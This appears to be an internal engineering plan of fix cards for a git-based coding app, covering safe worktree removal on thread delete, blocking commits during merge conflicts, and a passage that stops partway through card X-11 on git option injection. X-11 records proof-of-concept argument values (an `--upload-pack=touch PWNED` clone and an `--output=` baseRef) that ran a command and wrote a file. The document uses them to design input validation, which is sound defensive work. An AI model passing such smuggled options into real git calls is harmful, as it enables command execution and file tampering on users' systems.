# S7 Phase 1 additions (b): cards X-9 to X-16

Base: main at a712441fb. All line numbers verified against this checkout.

### X-9 Worktree removal on thread delete: inspect first, never force dirty work silently, reclaim the branch, fix bulk delete (TG-04, U-05)

- Problem: Deleting a thread force-removes its worktree (`force: true`, `apps/web/src/hooks/useThreadActions.ts:372`) after a confirm that shows only the basename (`formatWorktreePathForDisplay`, line 266 to 268, text at lines 276 to 280), discarding uncommitted and untracked work. `removeWorktree` (`apps/server/src/vcs/GitVcsDriverCore.ts:2458`) never deletes the `neokod/<hex>` branch, so branches pile up. Bulk delete (`apps/web/src/components/Sidebar.tsx:1890-1900`) passes every selected key as `deletedThreadKeys`, and `survivingThreads` (`useThreadActions.ts:258-261`) then treats all of them as gone, so when one deletion fails its worktree is still force-removed while that thread survives (U-05).
- Files to change:
  - `packages/contracts/src/git.ts` : add `VcsInspectWorktreeInput`, `VcsWorktreeGitState`, `VcsInspectWorktreeResult` after `VcsRemoveWorktreeInput` (line 159); add optional `deleteBranch` to `VcsRemoveWorktreeInput` (lines 159 to 163).
  - `packages/contracts/src/rpc.ts` : `WS_METHODS` (line 237 area) add `vcsInspectWorktree: "vcs.inspectWorktree"`; add `WsVcsInspectWorktreeRpc` after `WsVcsRemoveWorktreeRpc` (line 526); add it to the group list after `WsVcsRemoveWorktreeRpc` (line 1090); import the new schemas near line 30.
  - `apps/server/src/vcs/GitVcsDriver.ts` : service interface, add `inspectWorktree` next to `removeWorktree` (line 253).
  - `apps/server/src/vcs/GitVcsDriverCore.ts` : new `inspectWorktree`; extend `removeWorktree` (line 2458, success return at line 2470); export both in the returned object (line 2764).
  - `apps/server/src/git/GitWorkflowService.ts` : interface (line 82) and implementation (line 312) add `inspectWorktree` using `ensureGitCommand` (line 164).
  - `apps/server/src/ws.ts` : handler `[WS_METHODS.vcsInspectWorktree]` after `vcsRemoveWorktree` (line 2351); `projectionSnapshotQuery` is already in scope (line 1253).
  - `packages/client-runtime/src/state/vcs.ts` : add `inspectWorktree` command after `removeWorktree` (line 55).
  - `apps/web/src/worktreeCleanup.ts` : add `planWorktreeCleanup` and message builders (keep `getOrphanedWorktreePathForThread`, line 11).
  - `apps/web/src/hooks/useThreadActions.ts` : replace lines 258 to 287 and 363 to 406 with the inspect, plan, confirm, remove flow; add `readWorktreeCleanupCandidate` and `cleanupWorktrees`.
  - `apps/web/src/components/Sidebar.tsx` : bulk delete (lines 1890 to 1915).
  - `apps/server/src/server.test.ts` : add `inspectWorktree` to the mocked `gitWorkflow` at line 2095 (typecheck needs it).
- Change:
  1. Contracts (`git.ts`). Names and shapes:
     ```ts
     export const VcsInspectWorktreeInput = Schema.Struct({
       cwd: TrimmedNonEmptyStringSchema, // project root, same meaning as VcsRemoveWorktreeInput.cwd
       path: TrimmedNonEmptyStringSchema, // worktree path
       excludeThreadIds: Schema.optional(Schema.Array(ThreadId)),
     });
     export const VcsWorktreeGitState = Schema.Struct({
       path: TrimmedNonEmptyStringSchema,
       exists: Schema.Boolean,
       refName: Schema.NullOr(TrimmedNonEmptyStringSchema), // null = detached HEAD or path missing
       changedFileCount: NonNegativeInt, // tracked files with staged or unstaged changes
       untrackedFileCount: NonNegativeInt,
       localOnlyCommitCount: NonNegativeInt, // commits reachable from HEAD and from no other branch or remote ref, capped at 1000
       branchReclaimable: Schema.Boolean, // true when removeWorktree({deleteBranch:true}) would delete refName
     });
     export const VcsWorktreeLinkedThread = Schema.Struct({
       threadId: ThreadId,
       title: TrimmedNonEmptyStringSchema,
     });
     export const VcsInspectWorktreeResult = Schema.Struct({
       ...VcsWorktreeGitState.fields,
       linkedThreads: Schema.Array(VcsWorktreeLinkedThread), // non-deleted threads (archived included) whose worktreePath equals path, minus excludeThreadIds
     });
     ```
     Export the `type` aliases like the neighbouring schemas. In `VcsRemoveWorktreeInput` add `deleteBranch: Schema.optional(Schema.Boolean)`. Keep the success type `void`.
  2. RPC: `WsVcsInspectWorktreeRpc = Rpc.make(WS_METHODS.vcsInspectWorktree, { payload: VcsInspectWorktreeInput, success: VcsInspectWorktreeResult, error: GitCommandError })`.
  3. Driver `inspectWorktree` (returns `VcsWorktreeGitState`). All git calls use `executeGit` with `timeoutMs: 15_000`, `allowNonZeroExit: true`:
     - `exists = yield* fileSystem.exists(input.path)`. If false return `{ path, exists: false, refName: null, changedFileCount: 0, untrackedFileCount: 0, localOnlyCommitCount: 0, branchReclaimable: false }`.
     - Status, with `cwd = input.path`: `["status", "--porcelain=v1", "-z", "--no-renames", "--untracked-files=normal"]`. Split stdout on `"\0"`, drop empty entries; entries starting with `"??"` count as untracked, every other entry counts as changed. Non-zero exit fails with a `GitCommandError` (do not guess a count).
     - Branch: `["symbolic-ref", "--quiet", "--short", "HEAD"]`; exit 1 means detached, `refName = null`.
     - Local-only commits: with a branch `["rev-list", "--count", "--max-count=1000", "HEAD", "--not", `--exclude=${refName}`, "--branches", "--remotes"]`; detached `["rev-list", "--count", "--max-count=1000", "HEAD", "--not", "--branches", "--remotes"]`. Parse the trimmed stdout as an integer. (Verified with git 2.55: a fresh branch with one extra commit prints 1, and 0 once another branch contains it.)
     - `branchReclaimable = refName !== null && refName.startsWith(`${WORKTREE_BRANCH_PREFIX}/`) && localOnlyCommitCount === 0`. Import `WORKTREE_BRANCH_PREFIX` from `@neokod/shared/git` (already imported package at line 28 of the core file). Only `neokod/` branches are ever reclaimed, because a user can check out their own branch into a worktree.
  4. Driver `removeWorktree`: when `input.deleteBranch === true`, before the first `executeGit` (line 2466) call a local helper `readBranchForReclaim(path)` that, only if `fileSystem.exists(path)`, runs `symbolic-ref --quiet --short HEAD` and `rev-parse HEAD` in `cwd: input.path` and returns `{ refName, headSha } | null` (null on any failure or detached). At the success return (line 2470, `exitCode === 0`) replace `return;` with `return yield* reclaimBranch(...)`. `reclaimBranch({ cwd: input.cwd, refName, headSha })` does, in order, and swallows every failure with `Effect.catch` plus `Effect.logWarning` (a reclaim failure must never fail the removal):
     1. return if `!refName.startsWith(`${WORKTREE_BRANCH_PREFIX}/`)`;
     2. `["worktree", "list", "--porcelain"]` in `input.cwd`; return if `stdout.split("\n").includes(`branch refs/heads/${refName}`)` (checked out elsewhere, including the main worktree);
     3. `["rev-list", "--count", "--max-count=1", `refs/heads/${refName}`, "--not", `--exclude=${refName}`, "--branches", "--remotes"]`; return unless the count is `0`;
     4. compare-and-delete: `["update-ref", "-d", `refs/heads/${refName}`, headSha]` (a commit made concurrently makes the old value mismatch and git refuses, which keeps the branch). Reference: Synara `removeWorktree` compare-and-delete reclaim (`/var/folders/b6/87d2msqd6fdbtcddcw5k8gbw0000gn/T/opencode/synara/apps/server/src/git/Layers/GitCore.ts` around lines 3664 to 3745).
        Do not run the reclaim on the pruned or missing-path paths (lines 2540 onward); only after a clean `worktree remove`. Without `deleteBranch` the command sequence is unchanged (the mock-spawner test at `GitVcsDriverCore.test.ts:144-205` asserts the exact argv list).
  5. `GitWorkflowService.inspectWorktree`: `ensureGitCommand("GitWorkflowService.inspectWorktree", input.cwd).pipe(Effect.andThen(git.inspectWorktree(input)))`. Do not add the symphony `WorkspaceRemovalGuard` here (read only).
  6. `ws.ts` handler (inside `observeRpcEffect(WS_METHODS.vcsInspectWorktree, ..., { "rpc.aggregate": "vcs" })`):
     ```ts
     Effect.gen(function* () {
       const state = yield* gitWorkflow.inspectWorktree(input);
       const readModel = yield* projectionSnapshotQuery.getCommandReadModel().pipe(
         Effect.mapError(
           (cause) =>
             new GitCommandError({
               operation: "ws.vcsInspectWorktree",
               command: "read model",
               cwd: input.cwd,
               detail: "Unable to list the threads that use this worktree.",
               cause,
             }),
         ),
       );
       const excluded = new Set<string>(input.excludeThreadIds ?? []);
       const target = trimTrailingSeparators(input.path);
       const linkedThreads = readModel.threads
         .filter(
           (t) =>
             t.deletedAt === null &&
             t.worktreePath !== null &&
             trimTrailingSeparators(t.worktreePath) === target &&
             !excluded.has(t.id),
         )
         .map((t) => ({ threadId: t.id, title: t.title }));
       return { ...state, linkedThreads };
     });
     ```
     `trimTrailingSeparators` is a two-line local helper (`path.replace(/[\\/]+$/, "")`). No `refreshGitStatus` tap (read only). `OrchestrationThread` has `id`, `title`, `worktreePath`, `deletedAt` (`packages/contracts/src/orchestration.ts` lines 452 to 468).
  7. Client runtime: `inspectWorktree: createEnvironmentRpcCommand(runtime, { label: "environment-data:vcs:inspect-worktree", tag: WS_METHODS.vcsInspectWorktree, scheduler: vcsCommandScheduler, concurrency: vcsCommandConcurrency })`.
  8. `worktreeCleanup.ts` pure functions (the decision function the web test covers):
     ```ts
     export type WorktreeCleanupPlan =
       | { readonly kind: "keep" }
       | {
           readonly kind: "prompt";
           readonly confirmMessage: string;
           readonly discardMessage: string | null;
         };
     export function planWorktreeCleanup(i: VcsInspectWorktreeResult): WorktreeCleanupPlan;
     ```
     Rules: `linkedThreads.length > 0` returns `{ kind: "keep" }`. Otherwise `kind: "prompt"`. `dirty = i.changedFileCount + i.untrackedFileCount > 0`. `lostCommits = i.refName === null && i.localOnlyCommitCount > 0`. `discardMessage` is non-null exactly when `dirty || lostCommits`. When `exists` is false the counts are zero so the plain prompt shows. `confirmMessage` lines joined with `"\n"`:
     - `"This thread is the only one linked to this worktree:"`, then the full `i.path` (not the basename), then one branch line: `Branch ${refName} will be deleted too.` when `branchReclaimable`; `Branch ${refName} is kept (${n} commit${s} exist only on it).` when a branch has `localOnlyCommitCount > 0`; `Branch ${refName} is kept.` otherwise; `Detached HEAD (${n} commit${s} exist only here).` when `refName === null` and `localOnlyCommitCount > 0`; no line for detached with none.
     - when `dirty`: `Uncommitted work: ${changedFileCount} changed file${s}, ${untrackedFileCount} untracked file${s}.`
     - blank line, `"Delete the worktree too?"`.
       `discardMessage` (second confirm): `Discard unsaved work in ${path}?` newline then `${describeLoss}. This cannot be undone.` where `describeLoss` joins the non-zero parts of "N changed file(s)", "N untracked file(s)", "N commit(s) not on any branch".
       Keep `formatWorktreePathForDisplay` (still used elsewhere; grep before removing, do not delete it).
  9. `useThreadActions.ts`:
     - Add `const inspectWorktree = useAtomCommand(vcsEnvironment.inspectWorktree, { reportFailure: false })`.
     - Export `interface WorktreeCleanupCandidate { environmentId: EnvironmentId; threadId: ThreadId; projectCwd: string; worktreePath: string }`.
     - `readWorktreeCleanupCandidate(target: ScopedThreadRef): WorktreeCleanupCandidate | null` using `readThreadShell` and `readProject` (as lines 228 to 248 do); returns null when the thread has no `worktreePath` (trimmed) or the project is missing. It must be called before the thread is deleted because the shell disappears afterwards.
     - `cleanupWorktrees(candidates: readonly WorktreeCleanupCandidate[])`: group by `environmentId + "\0" + worktreePath`. For each group (sequentially): `excludeThreadIds = group.map(c => c.threadId)`; call `inspectWorktree({ environmentId, input: { cwd: projectCwd, path: worktreePath, excludeThreadIds } })`. On Failure: keep the worktree, show an info toast `Worktree kept` with description `Could not inspect ${worktreePath}. ${message}` (fail closed), continue. Run `planWorktreeCleanup`; `keep` skips silently. Otherwise `localApi.dialogs.confirm(plan.confirmMessage)`; if the user declines, skip. If `plan.discardMessage !== null`, ask `localApi.dialogs.confirm(plan.discardMessage)`; decline means skip. Then `removeWorktree({ environmentId, input: { cwd: projectCwd, path: worktreePath, force: plan.discardMessage !== null, deleteBranch: true } })`, then `refreshVcsStatus` as lines 375 to 381 do, and the same failure toast as lines 388 to 404 using the full path (replace `displayWorktreePath`). `force` is true only after the user accepted the second confirm. Return the first failure or null.
     - `deleteThread(target, opts)`: add `deferWorktreeCleanup?: boolean` to `opts`. Delete lines 258 to 287 and 363 to 406. Capture `const candidate = readWorktreeCleanupCandidate(threadRef)` before `stopThreadSession` (line 289). After the navigation block (line 361): `if (opts.deferWorktreeCleanup || candidate === null) return deleteResult; const failure = await cleanupWorktrees([candidate]); return failure ?? deleteResult;`. Keep `deletedThreadKeys` handling only for `getFallbackThreadIdAfterDelete` (line 306).
     - Return `readWorktreeCleanupCandidate` and `cleanupWorktrees` from the `useMemo` (line 452) and its dependency list.
  10. `Sidebar.tsx` bulk delete: inside the `runBulkThreadDeletes` callback, before `deleteThread`, `const candidate = readWorktreeCleanupCandidate(ref)`; call `deleteThread(ref, { deletedThreadKeys, deferWorktreeCleanup: true })`; push `candidate` to a local `worktreeCandidates` array only on success. After `runBulkThreadDeletes` resolves (line 1891 call) and before the failure toast, `await cleanupWorktrees(worktreeCandidates)`. The server read model now decides sharing: a thread whose deletion failed still exists, so its worktree comes back with `linkedThreads.length > 0` and is kept. Add both functions to the `useCallback` deps (line 1936 area).
- Do not:
  - Do not change `removeWorktree` default argv or add the `deleteBranch` steps to the mock-spawner sequence (`GitVcsDriverCore.test.ts:204` asserts it); card X-11 separately adds `--` before the path, so apply X-11 after this card and update that expected array there.
  - Do not pass `force: true` unless the second confirm was accepted; do not retry with force after a non-force failure.
  - Do not delete branches that do not start with `neokod/`, and do not use `git branch -D`; use the compare-and-delete `update-ref`.
  - Do not trust the web store for "other threads use it"; the server read model is the authority. Do not touch the symphony caller (`apps/server/src/symphony/Workspaces/Manager.ts:269`), which keeps calling `removeWorktree` without `deleteBranch`.
- Tests:
  - `apps/server/src/vcs/GitVcsDriverCore.test.ts` (inside the existing worktree `describe`, near the test at line 753; reuse `makeTmpDir`, `initRepoWithCommit`, `git`, `writeTextFile`, `GitVcsDriver.GitVcsDriver`). Create the worktree with `driver.createWorktree({ cwd, path: worktreePath, refName: initialBranch, newRefName: "neokod/abcd1234" })`.
    - `inspectWorktree reports changed, untracked and local-only counts`: write `README.md` modified, new untracked `new.txt`, new committed `committed.txt` in the worktree (`git add`, `git commit`). Assert `exists true`, `refName "neokod/abcd1234"`, `changedFileCount 1`, `untrackedFileCount 1`, `localOnlyCommitCount 1`, `branchReclaimable false`.
    - `inspectWorktree treats a fresh neokod branch as reclaimable`: no edits; assert counts 0 and `branchReclaimable true`.
    - `inspectWorktree reports a missing path as not existing`.
    - `removeWorktree with deleteBranch deletes a reclaimable neokod branch`: after removal `git(cwd, ["branch", "--list", "neokod/abcd1234"])` equals `""`.
    - `removeWorktree with deleteBranch keeps a branch that has unique commits`: commit in the worktree, remove, branch still listed.
    - `removeWorktree with deleteBranch keeps non-neokod branches`: use `newRefName: "feature/keep"`.
    - `removeWorktree without force refuses a dirty worktree`: modify a tracked file, expect `Effect.flip` error with `detail` containing `contains modified or untracked files`, directory still exists.
      The two keep tests and the reclaim test must FAIL on the base commit (no `deleteBranch`, no `inspectWorktree`).
  - `apps/web/src/worktreeCleanup.test.ts` (extend; reuse its `makeThread` style, build a `VcsInspectWorktreeResult` literal): `planWorktreeCleanup keeps the worktree when another thread is linked`; `... asks one confirm for a clean worktree and names the full path` (assert `confirmMessage` contains the full `/tmp/repo/worktrees/neokod-abcd1234`, `discardMessage` is null, contains `Branch neokod/abcd1234 will be deleted too.`); `... requires a discard confirm when there are changed or untracked files` (assert both counts appear and `discardMessage` is non-null); `... flags unreachable commits on a detached HEAD`; `... keeps the branch line when the branch has unique commits`. Fail on base (function missing).
  - `apps/server/src/server.test.ts`: only the added mock method so the typecheck passes; optionally one `client[WS_METHODS.vcsInspectWorktree]` call asserting the mocked state is returned with `linkedThreads: []`.
- Verify: from `apps/server` run `PATH=<node24>:$PATH pnpm exec vp test run src/vcs/GitVcsDriverCore.test.ts` and `pnpm exec vp test run src/server.test.ts`; from `apps/web` run `pnpm exec vp test run src/worktreeCleanup.test.ts`; `pnpm exec tsgo --noEmit` in `packages/contracts`, `packages/client-runtime`, `apps/server`, `apps/web`; then `vp check` and `vp run typecheck` at the repo root. Manual: new worktree thread, edit a tracked file and add an untracked file, delete the thread: the dialog shows the full path and counts, a second confirm appears, declining keeps the directory; accepting removes it. For a clean worktree the branch `neokod/<hex>` is gone from `git branch -a`.
- Depends on: none (apply before X-11, see Do not). Effort: L. Commit message: `fix: inspect worktree state before thread delete and reclaim safe branches`

### X-10 Refuse commit and push during unresolved merge conflicts, and report merge or rebase in progress (TG-13)

- Problem: `prepareCommitContext` runs `git add -A` (`apps/server/src/vcs/GitVcsDriverCore.ts:1617`), which marks conflicted paths resolved, and the next step commits the conflict markers; `commit_push` then publishes them. Status has no conflict, merge or rebase field: `readStatusDetailsLocal` (line 1389) parses `u ` records only as changed paths (`parsePorcelainPath`, line 178) and `VcsStatusLocalShape` (`packages/contracts/src/git.ts:201-219`) carries no operation state, so a rebase looks like a plain detached HEAD.
- Files to change:
  - `packages/contracts/src/git.ts` : add `VcsOperationInProgress`, two optional fields in `VcsStatusLocalShape` (line 201), new error `GitUnmergedPathsError`, add it to `GitManagerServiceError` (line 380).
  - `apps/server/src/vcs/GitVcsDriver.ts` : `GitStatusDetails` (line 56) add optional fields.
  - `apps/server/src/vcs/GitVcsDriverCore.ts` : `readStatusDetailsLocal` (line 1389): collect unmerged paths and detect the operation; return them (the returned object after the file stat loop); `status` mapping (line 1584).
  - `apps/server/src/git/GitManager.ts` : `readLocalStatus` (line 786) pass the fields through; `runStackedAction.runAction` (line 1868) refuse.
  - `packages/shared/src/git.ts` : `toLocalStatusPart` (line 235) pass the fields through (it copies fields by name, so they would be dropped on `localUpdated` merges).
  - `apps/web/src/components/GitActionsControl.logic.ts` : new `resolveConflictBlockReason`; use it in `buildMenuItems` (line 99), `resolveQuickAction` (line 167), `getMenuActionDisabledReason` (line 312).
  - `apps/web/src/components/EnvironmentPanel.logic.ts` : `resolveCommitPushAction` (line 121).
  - `apps/web/src/components/GitActionsControl.tsx` : warning line next to the detached HEAD note (line 1013).
  - `packages/client-runtime/src/state/gitActions.ts` : near duplicate of the web logic (`buildMenuItems` line 85, `resolveQuickAction` line 151), exported through `packages/client-runtime/src/state/vcs.ts:82` and not imported by the web app. Apply the same one-line guard there only if you keep it; do not extend the duplication otherwise.
- Change:
  1. Contracts (`git.ts`):
     ```ts
     export const VcsOperationInProgress = Schema.Literals(["merge", "rebase", "cherry-pick", "revert"]);
     export type VcsOperationInProgress = typeof VcsOperationInProgress.Type;
     // inside VcsStatusLocalShape, after workingTree:
     operationInProgress: Schema.optional(VcsOperationInProgress),
     unmergedPaths: Schema.optional(Schema.Array(TrimmedNonEmptyStringSchema)),
     ```
     Absent means none or unknown. `unmergedPaths` is present only when non-empty and holds at most 100 paths.
     ```ts
     export class GitUnmergedPathsError extends Schema.TaggedErrorClass<GitUnmergedPathsError>()(
       "GitUnmergedPathsError",
       {
         cwd: TrimmedNonEmptyStringSchema,
         operationInProgress: Schema.optional(VcsOperationInProgress),
         unmergedPaths: Schema.Array(TrimmedNonEmptyStringSchema),
       },
     ) {
       override get message(): string {
         const shown = this.unmergedPaths.slice(0, 5).join(", ");
         const more =
           this.unmergedPaths.length > 5 ? ` and ${this.unmergedPaths.length - 5} more` : "";
         return `Resolve merge conflicts before committing or pushing. Unmerged: ${shown}${more}.`;
       }
     }
     ```
     Add `GitUnmergedPathsError` to the `GitManagerServiceError` union.
  2. `GitStatusDetails`: add `operationInProgress?: VcsOperationInProgress | undefined; unmergedPaths?: readonly string[] | undefined;` (optional so `NON_REPOSITORY_STATUS_DETAILS` at `GitVcsDriverCore.ts:65` and `nonRepositoryStatusDetails` at `GitManager.ts:773` need no change).
  3. `readStatusDetailsLocal`: in the status line loop (line 1460), for a line that starts with `"u "` push `line.split(" ").slice(10).join(" ")` (porcelain v2 unmerged record has 10 fixed fields before the path; verified: `u UU N... 100644 100644 100644 100644 <h1> <h2> <h3> c.txt`) onto a local `unmergedPaths` array when non-empty, capped at 100. Keep the existing `hasWorkingTreeChanges` logic unchanged.
  4. Operation detection, in the `Effect.all` block at line 1426 add a fifth effect `readOperationInProgress(cwd)`:
     ```ts
     const readOperationInProgress = (cwd: string) =>
       executeGit(
         "GitVcsDriver.statusDetails.gitPaths",
         cwd,
         [
           "rev-parse",
           "--git-path",
           "rebase-merge",
           "--git-path",
           "rebase-apply",
           "--git-path",
           "MERGE_HEAD",
           "--git-path",
           "CHERRY_PICK_HEAD",
           "--git-path",
           "REVERT_HEAD",
         ],
         { timeoutMs: 5_000 },
       ).pipe(
         Effect.flatMap((result) => {
           const [rebaseMerge, rebaseApply, mergeHead, cherryPickHead, revertHead] = result.stdout
             .split("\n")
             .map((p) => path.resolve(cwd, p.trim()));
           // exists() each, first hit wins in this order:
           // rebase-merge|rebase-apply -> "rebase", MERGE_HEAD -> "merge", CHERRY_PICK_HEAD -> "cherry-pick", REVERT_HEAD -> "revert"
         }),
         Effect.orElseSucceed(() => undefined),
       );
     ```
     `--git-path` resolves per-worktree state (verified for a linked worktree: `.git/worktrees/w2/MERGE_HEAD`) and returns paths relative to `cwd` in a normal checkout, hence `path.resolve(cwd, ...)`. Use `fileSystem.exists` and `Effect.orElseSucceed(() => false)`. Return it in the details with a conditional spread: `...(operationInProgress ? { operationInProgress } : {})`, and `...(unmergedPaths.length > 0 ? { unmergedPaths } : {})`. Note `rebase-apply` is also used by `git am`; treat it as `"rebase"` (see Open questions).
  5. Pass-through: add the same two conditional spreads in `status` (`GitVcsDriverCore.ts:1584`), `readLocalStatus` (`GitManager.ts:786`) and `toLocalStatusPart` (`packages/shared/src/git.ts:235`).
  6. Refuse: in `runAction` right after `const initialStatus = yield* gitCore.statusDetails(input.cwd);` (`GitManager.ts:1868`) and before `wantsCommit` is used for anything with side effects:
     ```ts
     const wantsCommitOrPush =
       isCommitAction(input.action) || input.action === "push" || input.action === "create_pr";
     if (wantsCommitOrPush && (initialStatus.unmergedPaths?.length ?? 0) > 0) {
       return (
         yield *
         new GitUnmergedPathsError({
           cwd: input.cwd,
           ...(initialStatus.operationInProgress
             ? { operationInProgress: initialStatus.operationInProgress }
             : {}),
           unmergedPaths: initialStatus.unmergedPaths ?? [],
         })
       );
     }
     ```
     This covers `commit`, `commit_push`, `commit_push_pr`, `push`, `create_pr`. The existing `Effect.tapError` (line 2038) turns it into an `action_failed` event with `error.message`, so the toast shows the clear text. A merge with all conflicts staged and resolved is still allowed to commit (it concludes the merge); a push from a rebase is already refused by `Cannot push from detached HEAD` (line 1909).
  7. Web logic. In `GitActionsControl.logic.ts` add and export:
     ```ts
     export function resolveConflictBlockReason(gitStatus: VcsStatusResult | null): string | null {
       const count = gitStatus?.unmergedPaths?.length ?? 0;
       if (count > 0)
         return `${count} file${count === 1 ? " has" : "s have"} merge conflicts. Resolve them before committing or pushing.`;
       if (gitStatus?.operationInProgress === "rebase")
         return "Rebase in progress. Finish or abort it in the terminal.";
       return null;
     }
     ```
     In `resolveQuickAction`, after the `!gitStatus` return (line 187): `const conflictReason = resolveConflictBlockReason(gitStatus); if (conflictReason) return { label: gitStatus.unmergedPaths?.length ? "Resolve conflicts" : "Rebase in progress", disabled: true, kind: "show_hint", hint: conflictReason };`. In `buildMenuItems` set `canCommit`, `canPush`, `canCreatePr` to false when `resolveConflictBlockReason(gitStatus) !== null`; in `getMenuActionDisabledReason` return that reason before the other checks (after the busy and status checks); in `EnvironmentPanel.logic.ts` `resolveCommitPushAction` return `{ ...base, disabled: true, disabledReason: reason }` after the `!gitStatus` check. In `GitActionsControl.tsx` render, above the detached HEAD note (line 1013), `{resolveConflictBlockReason(gitStatus) && <p className="px-2 py-1.5 text-xs text-warning">{reason}</p>}`; and when `gitStatus?.operationInProgress` is set, append ` (merge in progress)` style text in that same line is not needed because the reason already names it; for `merge`, `cherry-pick` and `revert` with no unmerged paths show `Merge in progress.` (use a small map of the four literals to labels) so the state is visible.
- Do not:
  - Do not run `git status` with `--porcelain=1` or add `-z` here; the loop at line 1460 splits on newlines and `parsePorcelainPath` depends on porcelain v2.
  - Do not make the new contract fields required; many literal status objects (tests, `GitWorkflowService.ts:105`, `packages/shared/src/git.ts:259-270`, `apps/server/integration/OrchestrationEngineHarness.integration.ts:342`) would break for no benefit.
  - Do not auto-abort or auto-resolve anything, and do not block `commit` in a merge whose conflicts are all resolved.
  - Do not rely on the client check alone; the server refusal is the authority.
- Tests:
  - `apps/server/src/git/GitManager.test.ts` (reuse `makeTempDir`, `initRepo` at line 241, `runGit` at line 212, `makeManager` at line 657, `runStackedAction` at line 622, `NodeFS`/`NodePath`). Test `refuses commit while the merge has unmerged paths`: `initRepo`; `git checkout -b side`; write `README.md` as `side\n`; commit; `git checkout main`; write `README.md` as `main\n`; commit; `runGit(repoDir, ["merge", "side"], true)` (exit 1 expected). Then `const exit = yield* Effect.exit(runStackedAction(manager, { cwd: repoDir, action: "commit" }))`; assert it failed with `_tag === "GitUnmergedPathsError"` and `unmergedPaths` equal to `["README.md"]`; assert `git log -1 --pretty=%s` is still the main commit message and `git status --porcelain=v2` still has a `u ` line (nothing was staged by `add -A`). Same with `action: "commit_push"` (no remote needed, it must fail before push). Test `allows concluding a merge after the conflict is resolved`: after the merge conflict, write a resolved `README.md`, `git add README.md`, run `commit`; assert result `commit.status === "created"`. The first test must FAIL on base (commit succeeds with markers).
  - `apps/server/src/vcs/GitVcsDriverCore.test.ts` (reuse `initRepoWithCommit`, `git`, `writeTextFile`): `statusDetailsLocal reports unmerged paths and merge in progress` (assert `operationInProgress === "merge"`, `unmergedPaths` deep equals `["c.txt"]`); `... reports rebase in progress` (`git rebase side` conflicting; assert `operationInProgress === "rebase"`, `branch === null`); `... reports cherry-pick in progress`; `... reports none on a clean repo` (both fields `undefined`). Produce conflicts with `driver.execute({ ..., args: ["merge", "side"], allowNonZeroExit: true })`.
  - `apps/web/src/components/GitActionsControl.logic.test.ts` (reuse `status()` at line 14): `resolveQuickAction blocks with a hint when unmerged paths exist` (assert `disabled true`, `kind "show_hint"`, hint contains `merge conflicts`); `buildMenuItems disables commit and push during a rebase`; `resolveConflictBlockReason returns null on a clean status`.
  - `packages/shared/src/git.test.ts`: `applyGitStatusStreamEvent keeps conflict fields across a remoteUpdated event` (snapshot with `unmergedPaths: ["a.txt"]`, then `remoteUpdated`, assert still present).
- Verify: from `apps/server` `pnpm exec vp test run src/git/GitManager.test.ts` and `pnpm exec vp test run src/vcs/GitVcsDriverCore.test.ts`; from `apps/web` `pnpm exec vp test run src/components/GitActionsControl.logic.test.ts`; from `packages/shared` `pnpm exec vp test run src/git.test.ts`; `pnpm exec tsgo --noEmit` in `packages/contracts`, `packages/shared`, `packages/client-runtime`, `apps/server`, `apps/web`; `vp check` and `vp run typecheck` at the root. Manual: create a conflicting merge in a project, the Git menu shows `Resolve conflicts` disabled and the toast text appears if an action is forced over RPC.
- Depends on: none. Effort: M. Commit message: `fix(git): refuse commit and push with unmerged paths and report merge or rebase state`

### X-11 Option injection in git argv: one shared name validator, `--` ordering and `--end-of-options` at every call site (TG-06, CP-12)

- Problem: User-supplied names reach git as positional arguments. `switchRef` ends in `["checkout", input.refName]` (`apps/server/src/vcs/GitVcsDriverCore.ts:2684`), so `refName: "-f"` runs `git checkout -f` and discards local changes; `createRef` runs `["branch", input.refName]` (line 2702); `createWorktree` runs `["worktree", "add", ...]` with the names and path positional (lines 2337 to 2338); `git clone <url> <dir>` at `apps/server/src/sourceControl/SourceControlRepositoryService.ts:209`; and range diffs build `${baseRef}..HEAD` with the ref first (lines 1249, 1853, 1995). Verified with git 2.55 in a scratch repo: `git clone --upload-pack=touch\ PWNED r c3` executed `touch PWNED`, and `git diff --stat "--output=/tmp/x..HEAD"` wrote a file at that path (the `review.getDiffPreview` RPC takes `baseRef` from the client, `packages/contracts/src/review.ts:8`). The contract only requires a trimmed non-empty string (`packages/contracts/src/git.ts:136-143,166-170,178-181`).
- Files to change:
  - `packages/shared/src/git.ts` : add `validateGitRefName` and `validateGitArgumentValue` (the file is already exported as `@neokod/shared/git`, `packages/shared/package.json` lines 18 to 21, so no new subpath export is needed).
  - `apps/server/src/vcs/GitVcsDriverCore.ts` : helper `failOnInvalidGitName`; changes at the call sites listed in step 3.
  - `apps/server/src/sourceControl/SourceControlRepositoryService.ts` : `cloneRepository` (line 206 to 212).
  - `apps/server/src/symphony/Review/ModelReviewer.ts` : lines 192 and 197; `apps/server/src/symphony/Evidence/Service.ts` : line 156.
  - Tests: `packages/shared/src/git.test.ts`, `apps/server/src/vcs/GitVcsDriverCore.test.ts` (including the expected argv at line 204), `apps/server/src/sourceControl/SourceControlRepositoryService.test.ts` (expected argv at line 182).
- Change:
  1. Validator (in `packages/shared/src/git.ts`). Validation lives in the driver, not in a contracts Schema filter, for two reasons: `packages/contracts` is schema-only and cannot import `packages/shared`, and a Schema failure surfaces as an untyped defect while the driver returns the `GitCommandError` that these RPCs already declare (`packages/contracts/src/rpc.ts` lines 520 to 540). All callers (RPC, `GitManager`, Symphony, `BitbucketApi`) converge on the driver.
     ```ts
     /** Returns a human readable problem, or null when `value` is safe to pass as a git ref or remote name. */
     export function validateGitRefName(value: string, label = "Ref name"): string | null;
     /** For revisions, URLs and similar free text that go on a git command line (no ref grammar). */
     export function validateGitArgumentValue(value: string, label: string): string | null;
     ```
     `validateGitRefName` rules, checked in this order, each returning `${label} ...`: empty; longer than 255 UTF-16 units; starts with `-` (message `must not start with '-'`); contains a control character (code under 0x20 or 0x7f); contains any of space `~ ^ : ? * [ \`; contains `..`; contains `@{`; equals `@`; starts or ends with `/`; contains `//`; ends with `.`; any `/` separated component starts with `.` or ends with `.lock`. These are the `git check-ref-format` rules plus the dash rule (verified locally with `git check-ref-format --branch`: `-f`, `--upload-pack=x`, `a..b`, `a b`, `a@{b`, `a.lock`, `a/`, `/a`, `a//b` are rejected and the unicode name `é` is accepted, so unicode must pass). `validateGitArgumentValue` rejects empty, a leading `-` and control characters only.
  2. Driver helper in `GitVcsDriverCore.ts` next to `gitCommandContext` (line 350):
     ```ts
     const failOnInvalidGitName = (operation: string, cwd: string, problem: string | null) =>
       problem === null
         ? Effect.void
         : Effect.fail(
             new GitCommandError({
               ...gitCommandContext({ operation, cwd, args: [] }),
               detail: problem,
             }),
           );
     ```
